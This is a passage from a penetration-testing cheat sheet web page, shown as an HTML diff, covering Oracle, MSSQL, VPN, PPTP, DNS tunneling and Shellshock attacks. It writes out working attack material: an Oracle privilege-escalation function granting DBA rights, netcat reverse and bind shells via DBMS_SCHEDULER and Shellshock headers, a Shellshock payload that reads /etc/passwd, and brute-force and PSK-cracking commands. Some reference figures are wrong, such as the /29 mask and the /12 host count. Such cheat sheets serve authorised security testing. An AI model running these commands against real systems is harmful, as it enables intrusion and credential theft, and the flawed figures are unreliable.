+</code></pre>
+</div>
+<h4 id="brute-force-oracle-user-accounts">Brute force oracle user accounts<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#brute-force-oracle-user-accounts"><i class="fa fa-link"></i></a></h4>
+<p>Identify default Oracle accounts:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code> nmap --script=oracle-sid-brute 
+ nmap --script=oracle-brute 
+</code></pre>
+</div>
+<p>Run nmap scripts against Oracle TNS:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -p 1521 -A TARGET
+</code></pre>
+</div>
+<h4 id="oracle-privilege-escalation">Oracle Privilege Escalation<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#oracle-privilege-escalation"><i class="fa fa-link"></i></a></h4>
+<p>Requirements:</p>
+<ul>
+<li>Oracle needs to be exposed on the network</li>
+<li>A default account is in use like scott</li>
+</ul>
+<p>Quick overview of how this works:</p>
+<ol>
+<li>Create the function</li>
+<li>Create an index on table SYS.DUAL</li>
+<li>The index we just created executes our function SCOTT.DBA_X</li>
+<li>The function will be executed by SYS user (as that’s the user that owns the table).</li>
+<li>Create an account with DBA priveleges</li>
+</ol>
+<p>In the example below the user SCOTT is used but this should be possible with another default Oracle account.</p>
+<h5 id="identify-default-accounts-within-oracle-db-using-nmap-nse-scripts">Identify default accounts within oracle db using NMAP NSE scripts:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#identify-default-accounts-within-oracle-db-using-nmap-nse-scripts"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap --script=oracle-sid-brute 
+nmap --script=oracle-brute 
+</code></pre>
+</div>
+<p>Login using the identified weak account (assuming you find one).</p>
+<h5 id="how-to-identify-the-current-privilege-level-for-an-oracle-user">How to identify the current privilege level for an oracle user:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#how-to-identify-the-current-privilege-level-for-an-oracle-user"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>SQL&gt; select * from session_privs; 
+
+SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
+curren_user is 
+pragma autonomous_transaction; 
+begin 
+execute immediate 'grant dba to user1 identified by pass1';
+commit;
+return 'FOO';
+end;
+</code></pre>
+</div>
+<h5 id="oracle-priv-esc-and-obtain-dba-access">Oracle priv esc and obtain DBA access:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#oracle-priv-esc-and-obtain-dba-access"><i class="fa fa-link"></i></a></h5>
+<p>Run netcat: <code>netcat -nvlp 443</code>code&gt;</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
+</code></pre>
+</div>
+<h5 id="run-the-exploit-with-a-select-query">Run the exploit with a select query:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#run-the-exploit-with-a-select-query"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>SQL&gt; Select * from session_privs; 
+</code></pre>
+</div>
+<p>You should have a DBA user with creds user1 and pass1.</p>
+<p>Verify you have DBA privileges by re-running the first command again.</p>
+<h5 id="remove-the-exploit-using">Remove the exploit using:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#remove-the-exploit-using"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>drop index exploit_1337; 
+</code></pre>
+</div>
+<h5 id="get-oracle-reverse-os-shell">Get Oracle Reverse os-shell:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#get-oracle-reverse-os-shell"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>begin
+dbms_scheduler.create_job( job_name    =&gt; 'MEH1337',job_type    =&gt;
+    'EXECUTABLE',job_action =&gt; '/bin/nc',number_of_arguments =&gt; 4,start_date =&gt;
+    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); 
+dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
+dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
+dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
+dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
+dbms_scheduler.enable('rev_shell'); 
+end; 
+</code></pre>
+</div>
+<h3 id="mssql">MSSQL<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#mssql"><i class="fa fa-link"></i></a></h3>
+<p>Enumeration / Discovery:</p>
+<p>Nmap:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
+</code></pre>
+</div>
+<p>Metasploit:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping
+</code></pre>
+</div>
+<div class="note tip">
+<h5>Use MS SQL Servers Browse For More</h5>
+<p>Try using "Browse for More" via MS SQL Server Management Studio</p>
+</div>
+<h4 id="bruteforce-mssql-login">Bruteforce MSSQL Login<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#bruteforce-mssql-login"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use auxiliary/admin/mssql/mssql_enum
+</code></pre>
+</div>
+<h4 id="metasploit-mssql-shell">Metasploit MSSQL Shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#metasploit-mssql-shell"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/windows/mssql/mssql_payload
+msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+</code></pre>
+</div>
+<h2 id="network">Network<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#network"><i class="fa fa-link"></i></a></h2>
+<h3 id="plinkexe-tunnel">Plink.exe Tunnel<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#plinkexe-tunnel"><i class="fa fa-link"></i></a></h3>
+<p>PuTTY Link tunnel</p>
+<p>Forward remote port to local address:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
+</code></pre>
+</div>
+<h3 id="pivoting">Pivoting<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pivoting"><i class="fa fa-link"></i></a></h3>
+<h4 id="ssh-pivoting">SSH Pivoting<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ssh-pivoting"><i class="fa fa-link"></i></a></h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
+</code></pre>
+</div>
+<p>Add socks4 127.0.0.1 1010 in /etc/proxychains.conf</p>
+<p>SSH pivoting from one network to another:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
+</code></pre>
+</div>
+<p>Add socks4 127.0.0.1 1010 in /etc/proxychains.conf</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
+</code></pre>
+</div>
+<p>Add socks4 127.0.0.1 1011 in /etc/proxychains.conf</p>
+<h4 id="meterpreter-pivoting">Meterpreter Pivoting<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#meterpreter-pivoting"><i class="fa fa-link"></i></a></h4>
+<h3 id="ttl-finger-printing">TTL Finger Printing<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ttl-finger-printing"><i class="fa fa-link"></i></a></h3>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Operating System</th>
+<th>TTL Size</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p>Windows</p>
+</td>
+<td>
+<p><code>128</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Linux</p>
+</td>
+<td>
+<p><code>64</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Solaris</p>
+</td>
+<td>
+<p><code>255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Cisco / Network</p>
+</td>
+<td>
+<p><code>255</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="ipv4-cheat-sheets">IPv4 Cheat Sheets<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ipv4-cheat-sheets"><i class="fa fa-link"></i></a></h3>
+<h4 id="classful-ip-ranges">Classful IP Ranges<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#classful-ip-ranges"><i class="fa fa-link"></i></a></h4>
+<p>E.g Class A,B,C (depreciated)</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>IP Address Range</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p>Class A IP Address Range</p>
+</td>
+<td>
+<p><code>0.0.0.0 - 127.255.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Class B IP Address Range</p>
+</td>
+<td>
+<p><code>128.0.0.0 - 191.255.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Class C IP Address Range</p>
+</td>
+<td>
+<p><code>192.0.0.0 - 223.255.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Class D IP Address Range</p>
+</td>
+<td>
+<p><code>224.0.0.0 - 239.255.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Class E IP Address Range</p>
+</td>
+<td>
+<p><code>240.0.0.0 - 255.255.255.255</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="ipv4-private-address-ranges">IPv4 Private Address Ranges<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ipv4-private-address-ranges"><i class="fa fa-link"></i></a></h4>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>Range</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p>Class A Private Address Range</p>
+</td>
+<td>
+<p><code>10.0.0.0 - 10.255.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Class B Private Address Range</p>
+</td>
+<td>
+<p><code>172.16.0.0 - 172.31.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>Class C Private Address Range</p>
+</td>
+<td>
+<p><code>192.168.0.0 - 192.168.255.255</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p></p>
+ </td>
+<td>
+<p><code>127.0.0.0 - 127.255.255.255</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="ipv4-subnet-cheat-sheet">IPv4 Subnet Cheat Sheet<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ipv4-subnet-cheat-sheet"><i class="fa fa-link"></i></a></h4>
+<p>Subnet cheat sheet, not really realted to pen testing but a useful reference.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>CIDR</th>
+<th>Decimal Mask</th>
+<th>Number of Hosts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p>/31</p>
+</td>
+<td>
+<p><code>255.255.255.254</code></p>
+</td>
+<td>
+<p><code>1 Host</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/30</p>
+</td>
+<td>
+<p><code>255.255.255.252</code></p>
+</td>
+<td>
+<p><code>2 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/29</p>
+</td>
+<td>
+<p><code>255.255.255.249</code></p>
+</td>
+<td>
+<p><code>6 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/28</p>
+</td>
+<td>
+<p><code>255.255.255.240</code></p>
+</td>
+<td>
+<p><code>14 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/27</p>
+</td>
+<td>
+<p><code>255.255.255.224</code></p>
+</td>
+<td>
+<p><code>30 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/26</p>
+</td>
+<td>
+<p><code>255.255.255.192</code></p>
+</td>
+<td>
+<p><code>62 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/25</p>
+</td>
+<td>
+<p><code>255.255.255.128</code></p>
+</td>
+<td>
+<p><code>126 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/24</p>
+</td>
+<td>
+<p><code>255.255.255.0</code></p>
+</td>
+<td>
+<p><code>254 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/23</p>
+</td>
+<td>
+<p><code>255.255.254.0</code></p>
+</td>
+<td>
+<p><code>512 Host</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/22</p>
+</td>
+<td>
+<p><code>255.255.252.0</code></p>
+</td>
+<td>
+<p><code>1022 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/21</p>
+</td>
+<td>
+<p><code>255.255.248.0</code></p>
+</td>
+<td>
+<p><code>2046 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/20</p>
+</td>
+<td>
+<p><code>255.255.240.0</code></p>
+</td>
+<td>
+<p><code>4094 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/19</p>
+</td>
+<td>
+<p><code>255.255.224.0</code></p>
+</td>
+<td>
+<p><code>8190 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/18</p>
+</td>
+<td>
+<p><code>255.255.192.0</code></p>
+</td>
+<td>
+<p><code>16382 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/17</p>
+</td>
+<td>
+<p><code>255.255.128.0</code></p>
+</td>
+<td>
+<p><code>32766 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/16</p>
+</td>
+<td>
+<p><code>255.255.0.0</code></p>
+</td>
+<td>
+<p><code>65534 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/15</p>
+</td>
+<td>
+<p><code>255.254.0.0</code></p>
+</td>
+<td>
+<p><code>131070 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/14</p>
+</td>
+<td>
+<p><code>255.252.0.0</code></p>
+</td>
+<td>
+<p><code>262142 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/13</p>
+</td>
+<td>
+<p><code>255.248.0.0</code></p>
+</td>
+<td>
+<p><code>524286 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/12</p>
+</td>
+<td>
+<p><code>255.240.0.0</code></p>
+</td>
+<td>
+<p><code>1048674 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/11</p>
+</td>
+<td>
+<p><code>255.224.0.0</code></p>
+</td>
+<td>
+<p><code>2097150 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/10</p>
+</td>
+<td>
+<p><code>255.192.0.0</code></p>
+</td>
+<td>
+<p><code>4194302 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/9</p>
+</td>
+<td>
+<p><code>255.128.0.0</code></p>
+</td>
+<td>
+<p><code>8388606 Hosts</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p>/8</p>
+</td>
+<td>
+<p><code>255.0.0.0</code></p>
+</td>
+<td>
+<p><code>16777214 Hosts</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="vlan-hopping">VLAN Hopping<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#vlan-hopping"><i class="fa fa-link"></i></a></h3>
+<p>Using NCCGroups VLAN wrapper script for Yersina simplifies the process.</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/nccgroup/vlan-hopping.git
+chmod 700 frogger.sh
+./frogger.sh 
+</code></pre>
+</div>
+<h3 id="vpn-pentesting-tools">VPN Pentesting Tools<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#vpn-pentesting-tools"><i class="fa fa-link"></i></a></h3>
+<p>Identify VPN servers:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>./udp-protocol-scanner.pl -p ike TARGET(s)
+
+</code></pre>
+</div>
+<p>Scan a range for VPN servers:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>./udp-protocol-scanner.pl -p ike -f ip.txt
+</code></pre>
+</div>
+<h4 id="ikeforce">IKEForce<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ikeforce"><i class="fa fa-link"></i></a></h4>
+<p>Use IKEForce to enumerate or dictionary attack VPN servers.</p>
+<p>Install:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>pip install pyip
+git clone https://github.com/SpiderLabs/ikeforce.git
+</code></pre>
+</div>
+<p>Perform IKE VPN enumeration with IKEForce:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
+</code></pre>
+</div>
+<p>Bruteforce IKE VPN using IKEForce:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
+</code></pre>
+</div>
+<div class="highlighter-rouge"><pre class="highlight"><code>ike-scan
+ike-scan TARGET-IP
+ike-scan -A TARGET-IP
+ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
+</code></pre>
+</div>
+<h4 id="ike-aggressive-mode-psk-cracking">IKE Aggressive Mode PSK Cracking<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#ike-aggressive-mode-psk-cracking"><i class="fa fa-link"></i></a></h4>
+<ol>
+<li>Identify VPN Servers</li>
+<li>Enumerate with IKEForce to obtain the group ID</li>
+<li>Use ike-scan to capture the PSK hash from the IKE endpoint</li>
+<li>Use psk-crack to crack the hash</li>
+</ol>
+<h5 id="step-1-idenitfy-ike-servers">Step 1: Idenitfy IKE Servers<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-1-idenitfy-ike-servers"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>./udp-protocol-scanner.pl -p ike SUBNET/24
+</code></pre>
+</div>
+<h5 id="step-2-enumerate-group-name-with-ikeforce">Step 2: Enumerate group name with IKEForce<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-2-enumerate-group-name-with-ikeforce"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
+</code></pre>
+</div>
+<h5 id="step-3-use-ike-scan-to-capture-the-psk-hash">Step 3: Use ike-scan to capture the PSK hash<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-3-use-ike-scan-to-capture-the-psk-hash"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
+</code></pre>
+</div>
+<h5 id="step-4-use-psk-crack-to-crack-the-psk-hash">Step 4: Use psk-crack to crack the PSK hash<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#step-4-use-psk-crack-to-crack-the-psk-hash"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>psk-crack hash-file.txt
+</code></pre>
+</div>
+<p>Some more advanced psk-crack options below:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>pskcrack
+psk-crack -b 5 TARGET-IPkey
+psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
+psk-crack -d /path/to/dictionary-file TARGET-IP-key
+</code></pre>
+</div>
+<h4 id="pptp-hacking">PPTP Hacking<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pptp-hacking"><i class="fa fa-link"></i></a></h4>
+<p>Identifying PPTP, it listens on TCP: 1723</p>
+<h5 id="nmap-pptp-fingerprint">NMAP PPTP Fingerprint:<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#nmap-pptp-fingerprint"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap –Pn -sV -p 1723 TARGET(S)
+</code></pre>
+</div>
+<h5 id="pptp-dictionary-attack">PPTP Dictionary Attack<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#pptp-dictionary-attack"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
+</code></pre>
+</div>
+<h3 id="dns-tunneling">DNS Tunneling<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#dns-tunneling"><i class="fa fa-link"></i></a></h3>
+<p>Tunneling data over DNS to bypass firewalls.</p>
+<p>dnscat2 supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.</p>
+<h4 id="attacking-machine">Attacking Machine<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#attacking-machine"><i class="fa fa-link"></i></a></h4>
+<p>Installtion:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get update
+apt-get -y install ruby-dev git make g++
+gem install bundler
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server
+bundle install
+</code></pre>
+</div>
+<p>Run dnscat2:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>ruby ./dnscat2.rb
+dnscat2&gt; New session established: 1422
+dnscat2&gt; session -i 1422
+</code></pre>
+</div>
+<p>Target Machine:</p>
+<p>https://downloads.skullsecurity.org/dnscat2/
+https://github.com/lukebaggett/dnscat2-powershell/</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>dnscat --host &lt;dnscat server_ip&gt;
+</code></pre>
+</div>
+<h2 id="bof--exploit">BOF / Exploit<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#bof--exploit"><i class="fa fa-link"></i></a></h2>
+<h2 id="exploit-research">Exploit Research<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploit-research"><i class="fa fa-link"></i></a></h2>
+<p>Find exploits for enumerated hosts / services.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>searchsploit windows 2003 | grep -i local</code></p>
+</td>
+<td>
+<p>Search exploit-db for exploit, in this example windows 2003 + local esc</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>site:exploit-db.com exploit kernel &lt;= 3</code></p>
+</td>
+<td>
+<p>Use google to search exploit-db.com for exploits</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>grep -R "W7" /usr/share/metasploit-framework<br>/modules/exploit/windows/*</code></p>
+</td>
+<td>
+<p>Search metasploit modules using grep - msf search sucks a bit</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="searching-for-exploits">Searching for Exploits<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#searching-for-exploits"><i class="fa fa-link"></i></a></h3>
+<p>Install local copy of exploit-db:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code> searchsploit –u
+ searchsploit apache 2.2
+ searchsploit "Linux Kernel"
+ searchsploit linux 2.6 | grep -i ubuntu | grep local
+</code></pre>
+</div>
+<h3 id="compiling-windows-exploits-on-kali">Compiling Windows Exploits on Kali<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#compiling-windows-exploits-on-kali"><i class="fa fa-link"></i></a></h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+  wine mingw-get-setup.exe
+  select mingw32-base
+  cd /root/.wine/drive_c/windows
+  wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip
+  cd /root/.wine/drive_c/MinGW/bin
+  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+  wine ability.exe  
+</code></pre>
+</div>
+<h3 id="cross-compiling-exploits">Cross Compiling Exploits<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cross-compiling-exploits"><i class="fa fa-link"></i></a></h3>
+<div class="highlighter-rouge"><pre class="highlight"><code>gcc -m32 -o output32 hello.c (32 bit)
+gcc -m64 -o output hello.c (64 bit)
+</code></pre>
+</div>
+<h3 id="exploiting-common-vulnerabilities">Exploiting Common Vulnerabilities<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploiting-common-vulnerabilities"><i class="fa fa-link"></i></a></h3>
+<h4 id="exploiting-shellshock">Exploiting Shellshock<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#exploiting-shellshock"><i class="fa fa-link"></i></a></h4>
+<p>A tool to find and exploit servers vulnerable to Shellshock:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/nccgroup/shocker
+</code></pre>
+</div>
+<div class="highlighter-rouge"><pre class="highlight"><code>./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+</code></pre>
+</div>
+<h5 id="cat-file-view-file-contents">cat file (view file contents)<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#cat-file-view-file-contents"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+</code></pre>
+</div>
+<h5 id="shell-shock-run-bind-shell">Shell Shock run bind shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#shell-shock-run-bind-shell"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+</code></pre>
+</div>
+<h5 id="shell-shock-reverse-shell">Shell Shock reverse Shell<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#shell-shock-reverse-shell"><i class="fa fa-link"></i></a></h5>
+<div class="highlighter-rouge"><pre class="highlight"><code>nc -l -p 443
+</code></pre>
+</div>
+<h2 id="simple-local-web-servers">Simple Local Web Servers<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#simple-local-web-servers"><i class="fa fa-link"></i></a></h2>
+<p>Python local web server command, handy for serving up shells and exploits on an attacking machine.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>python -m SimpleHTTPServer 80</code></p>
+</td>
+<td>
+<p>Run a basic http server, great for serving up shells etc</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>python3 -m http.server</code></p>
+</td>
+<td>
+<p>Run a basic Python3 http server, great for serving up shells etc</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>ruby -rwebrick -e "WEBrick::HTTPServer.new<br>(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start"</code></p>
+</td>
+<td>
+<p>Run a ruby webrick basic http server</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>php -S 0.0.0.0:80</code></p>
+</td>
+<td>
+<p>Run a basic PHP http server</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="mounting-file-shares">Mounting File Shares<a class="header-link" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#mounting-file-shares"><i class="fa fa-link"></i></a></h2>
+<p>How to mount NFS / CIFS, Windows and Linux file shares.</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></p>
+</td>
+<td>
+<p>Mount NFS share to <code>/mnt/nfs</code> </p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>mount -t cifs -o username=user,password=pass<br>,domain=blah //192.168.1.X/share-name /mnt/cifs</code></p>
+</td>
+<td>
+<p>Mount Windows CIFS / SMB share on Linux at <code>/mnt/cifs</code> if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>net use Z: \\win-server\share password <br> /user:domain\janedoe /savecred /p:no</code></p>
+</td>
+<td>
+<p>Mount a Windows share on Windows from the command line</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>apt-get install smb4k -y</code></p>
+</td>
+<td>
+<p>Install smb4k on Kali, useful Linux GUI for browsing SMB shares</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
